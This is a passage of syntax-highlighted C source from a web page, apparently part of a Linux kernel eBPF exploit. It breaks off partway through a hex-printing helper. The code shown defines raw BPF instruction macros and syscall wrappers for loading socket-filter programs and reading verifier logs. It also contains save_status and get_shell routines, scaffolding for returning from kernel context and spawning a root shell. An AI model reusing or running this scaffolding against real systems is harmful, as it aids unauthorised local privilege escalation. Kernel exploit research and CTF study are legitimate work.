class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _BPF_DEFS_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BPF_DEFS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                        \</span></span><br><span class="line"><span class="meta">        .code = CODE,                          \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                        \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                        \</span></span><br><span class="line"><span class="meta">        .off = OFF,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64_RAW(DST, SRC, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                              \</span></span><br><span class="line"><span class="meta">        .code = BPF_LD | BPF_DW | BPF_IMM,           \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                              \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                              \</span></span><br><span class="line"><span class="meta">        .off = 0,                                    \</span></span><br><span class="line"><span class="meta">        .imm = (__u32)(IMM)&#125;),                       \</span></span><br><span class="line"><span class="meta">        ((struct bpf_insn)&#123;                          \</span></span><br><span class="line"><span class="meta">            .code = 0, <span class="comment">/* zero is reserved opcode */</span> \</span></span><br><span class="line"><span class="meta">            .dst_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .src_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .off = 0,                                \</span></span><br><span class="line"><span class="meta">            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory load, dst_reg = *(uint *) (src_reg + off16) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory store, *(uint *) (dst_reg + off16) = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                       \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                       \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                         \</span></span><br><span class="line"><span class="meta">        .off = OFF,                           \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP32_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = OFF,                             \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_IMM(DST, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                        \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_REG(DST, SRC)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_REG(DST, SRC)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                    \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_IMM(OP, DST, IMM)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_REG(OP, DST, SRC)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                         \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Program exit */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_EXIT_INSN()             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;             \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_EXIT, \</span></span><br><span class="line"><span class="meta">        .dst_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .off = 0,                   \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64(DST, IMM) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_MAP_FD(DST, MAP_FD) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// varies from userspace bpf_map_info definition so need to redefine</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __u32 type;</span><br><span class="line">    __u32 id;</span><br><span class="line">    __u32 key_size;</span><br><span class="line">    __u32 value_size;</span><br><span class="line">    __u32 max_entries;</span><br><span class="line">    __u32 map_flags;</span><br><span class="line">    <span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">    __u32 ifindex;</span><br><span class="line">    __u32 btf_vmlinux_value_type_id;</span><br><span class="line">    __u64 netns_dev;</span><br><span class="line">    __u64 netns_ino;</span><br><span class="line">    __u32 btf_id;</span><br><span class="line">    __u32 btf_key_type_id;</span><br><span class="line">    __u32 btf_value_type_id;</span><br><span class="line">&#125; __attribute__((aligned(<span class="number">8</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attrs, <span class="keyword">sizeof</span>(*attrs));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *map_attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, map_attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value, <span class="keyword">uint64_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    attr.flags = flags;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lookup_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">obj_get_info_by_fd</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_bpf_prog</span><span class="params">(struct bpf_insn *insn, <span class="keyword">uint32_t</span> cnt, <span class="keyword">int</span> log_level, <span class="keyword">int</span> *prog_fd_out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> prog_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> verifier_log_buff[<span class="number">0x200000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> socks[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attrs</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">            .insn_cnt = cnt,</span><br><span class="line">            .insns = (<span class="keyword">uint64_t</span>)insn,</span><br><span class="line">            .license = (<span class="keyword">uint64_t</span>) <span class="string">&quot;&quot;</span>,</span><br><span class="line">            .log_level = log_level,</span><br><span class="line">            .log_size = <span class="keyword">sizeof</span>(verifier_log_buff),</span><br><span class="line">            .log_buf = (<span class="keyword">uint64_t</span>)verifier_log_buff&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">        prog_fd = *prog_fd_out;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= prog_fd)</span><br><span class="line">        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt; prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(verifier_log_buff);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;dzhsb\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)))</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x7</span> != write(socks[<span class="number">1</span>], <span class="string">&quot;zzzzzzz&quot;</span>, <span class="number">7</span>))</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    <span class="keyword">if</span> (log_level == <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// char *each_line_log = strtok(verifier_log_buff, &quot;\n&quot;);</span></span><br><span class="line">        <span class="comment">// printf(&quot;%s\n&quot;, each_line_log);</span></span><br><span class="line">        <span class="comment">// each_line_log = strtok(NULL, &quot;\n&quot;);</span></span><br><span class="line">        <span class="comment">// while (each_line_log)</span></span><br><span class="line">        <span class="comment">// &#123;</span></span><br><span class="line">        <span class="comment">//     int len = strlen(each_line_log);</span></span><br><span class="line">        <span class="comment">//     if (len &gt; 231)</span></span><br><span class="line">        <span class="comment">//     &#123;</span></span><br><span class="line">        <span class="comment">//         printf(&quot;%s\n&quot;, each_line_log);</span></span><br><span class="line">        <span class="comment">//         printf(&quot;%s\n&quot;, (each_line_log + 231));</span></span><br><span class="line">        <span class="comment">//         each_line_log = strtok(NULL, &quot;\n&quot;);</span></span><br><span class="line">        <span class="comment">//         continue;</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">//     printf(&quot;%s\n&quot;, each_line_log);</span></span><br><span class="line">        <span class="comment">//     each_line_log = strtok(NULL, &quot;\n&quot;);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="built_in">puts</span>(verifier_log_buff);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">        *prog_fd_out = prog_fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        close(prog_fd);</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    close(socks[<span class="number">0</span>]);</span><br><span class="line">    close(socks[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span 